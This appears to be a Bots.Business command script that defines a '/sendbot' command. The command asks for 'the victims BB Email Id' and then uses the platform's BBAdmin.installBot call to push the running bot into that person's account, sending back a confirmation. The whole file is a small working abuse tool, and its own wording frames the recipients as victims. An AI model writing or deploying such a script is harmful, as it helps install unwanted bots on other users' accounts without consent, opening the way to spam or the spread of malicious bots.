/*CMD
  command: /sendbot
  help: 
  need_reply: true
  auto_retry_time: 
  folder: 
  answer: Enter the victims BB Email Id
  keyboard: 
  aliases: 
CMD*/

BBAdmin.installBot({
  email: message,
  bot_id: bot.id
})
Bot.sendMessage("*Bot Sent To* "+message)
 
